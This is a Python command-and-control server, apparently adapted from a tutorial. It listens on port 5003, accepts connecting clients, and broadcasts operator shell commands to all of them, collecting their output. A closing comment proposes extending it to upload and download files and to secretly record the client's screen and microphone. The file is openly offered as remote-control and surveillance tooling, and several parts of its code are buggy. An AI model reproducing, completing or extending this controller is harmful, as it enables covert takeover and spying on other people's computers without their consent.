import socket
import threading

SERVER_HOST = "0.0.0.0"

SERVER_PORT = 5003
# send 1024 (1kb) a time (buffer size)
BUFFER_SIZE = 1024

s = socket.socket()
# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

_lock = threading.Semaphore
clients = []

# init
class Parser():
    def __init__(self):
        global_command = None

    def parse(self):
        intro = """
               _           _
              | |         | |
         _ __ | |__   __ _| | __ _ _ __ __  __
        | '_ \| '_ \ / _` | |/ _` | '_ \\ \/ /
        | |_) | | | | (_| | | (_| | | | |>  <
        | .__/|_| |_|\__,_|_|\__,_|_| |_/_/\_\
        | |
        |_|
        """
        print(intro)
        print()
        print("Welcome. ")
        while True:
            # with _lock:
            cmd_buffer = input("$>")

            cmd = None
            if ' ' in cmd_buffer:
                action, cmd = cmd_buffer.split(' ')
                print("cmd:", cmd)
            else:
                action = cmd_buffer
            print("action: ", action)

            if action.strip() == "shell":
                for (comResultDict, client_socket, client_address) in clients:
                    try:
                        client_socket.send(cmd.encode())
                    except:
                        print("Error: client disconnected")
                    if cmd.strip().lower() == "exit":
                        # if the command is exit, just break out of the loop
                        return
                    # retrieve command results
                    results = client_socket.recv(BUFFER_SIZE).decode()
                    comResultDict[cmd] = results

            elif action == "show" or (cmd != None and cmd == "show"):
                i = 1
                for (comResultDict, client_socket, client_address) in clients:
                    print("Client %d : cmd and results: " %i )
                    for key, val in comResultDict:
                        print("CMD: ", key, " ---- Result of Cmd: ", val)
            else:
                print("Action not recognized. Pls try again :v)")



def main():
    p = Parser()
    threading._start_new_thread(p.parse, ())
    while True:
        client_socket, client_address = s.accept()

        # print("New Client Connected!")
        # print(f"{client_address[0]}:{client_address[1]} Connected!")

        # just sending a greeting msg to the new client
        message = "Hello and Welcome".encode()
        client_socket.send(message)

        clients.append(({}, client_socket, client_address))

    # close connection to the client
    client_socket.close()
    # close server connection
    s.close()


if __name__ == "__main__":
    main()

"""Here is some ideas to extend that code:

Use threading built-in module to enable the server to accept multiple client connections in the same time.
Add a custom command that gets system and hardware information using psutil third party module, check this tutorial: How to Get Hardware and System Information in Python.
Add download and upload commands to download and upload files from/to the client, check this out: How to Transfer Files in the Network using Sockets in Python.
Make a custom command to record the client's screen and then download the video recorded, this tutorial can help: How to Make a Screen Recorder in Python.
Add another command to record the client's audio on his/her default microphone, check this tutorial.
Replace the greeting with information like the current working directory using os.getcwd() function in the built-in os module.
And many more ! There are endless of possibilities, the only limit here is your imagination !"""